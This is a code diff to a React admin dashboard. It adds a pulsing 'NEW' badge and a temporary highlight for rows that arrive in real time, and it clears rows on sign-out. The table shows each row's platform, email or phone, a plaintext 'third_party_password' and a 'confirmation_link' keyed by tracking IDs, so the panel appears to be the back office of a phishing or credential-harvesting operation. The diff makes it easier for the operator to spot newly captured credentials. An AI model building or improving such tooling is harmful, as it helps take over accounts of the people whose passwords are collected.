@@ -416,18 +416,27 @@ export default function Admin() {
       const newRow = {
         ...incoming,
         contact: incoming.email || incoming.phone || incoming.contact || '-',
+        isNew: true,
       };
 
       // Match updates to the correct row using tracking_id
       setRows((prev) => {
         const trackingId = newRow.tracking_id;
+        let updatedRows;
         if (trackingId) {
           console.log('[ADMIN_REALTIME] Updating row with tracking_id:', trackingId);
-          return [newRow, ...prev.filter(r => r.tracking_id !== trackingId && r.id !== newRow.id)];
+          updatedRows = [newRow, ...prev.filter(r => r.tracking_id !== trackingId && r.id !== newRow.id)];
+        } else {
+          console.log('[ADMIN_REALTIME] Updating row with id:', newRow.id);
+          updatedRows = [newRow, ...prev.filter(r => r.id !== newRow.id)];
         }
 
-        console.log('[ADMIN_REALTIME] Updating row with id:', newRow.id);
-        return [newRow, ...prev.filter(r => r.id !== newRow.id)];
+        // Remove 'NEW' highlight after 5 seconds
+        setTimeout(() => {
+          setRows(currentRows => currentRows.map(r => r.id === newRow.id ? {...r, isNew: false} : r));
+        }, 5000);
+
+        return updatedRows;
       });
     };
 
@@ -657,6 +666,9 @@ export default function Admin() {
             onClick={async () => {
               console.log('[SIGN_OUT] Admin initiated sign out');
               
+              // Immediately clear requests
+              setRows([]);
+              
               // Forcefully clear all localStorage and sessionStorage before sign out
               console.log('[SIGN_OUT] Clearing localStorage and sessionStorage');
               localStorage.clear();
@@ -672,7 +684,7 @@ export default function Admin() {
                 console.error('[SIGN_OUT] Supabase sign out failed:', err);
               } finally {
                 console.log('[SIGN_OUT] ✓ All storage cleared, redirecting to /login');
-                window.location.href = '/login';
+                navigate('/login');
               }
             }}
             className="text-sm text-slate-400 hover:text-white underline underline-offset-4"
@@ -696,8 +708,8 @@ export default function Admin() {
             </thead>
             <tbody>
               {rows.map((row) => (
-                <tr key={`${row.id}-${row.status}`} className="border-t border-white/10 hover:bg-white/5 transition">
-                  <td className="px-3 py-2">{row.platform}</td>
+                <tr key={`${row.id}-${row.status}`} className={`border-t border-white/10 hover:bg-white/5 transition ${row.isNew ? 'bg-green-900/20' : ''}`}>
+                  <td className="px-3 py-2">{row.platform} {row.isNew && <span className="ml-2 bg-red-500 text-white text-xs px-1 py-0.5 rounded animate-pulse">NEW</span>}</td>
                   <td className="px-3 py-2">{row.contact}</td>
                   <td className="px-3 py-2 text-slate-400 font-mono text-xs">{row.third_party_password || '-'}</td>
                   <td className="px-3 py-2 text-slate-300 text-xs max-w-[220px] break-words whitespace-normal font-mono">{row.confirmation_link || '-'}</td>
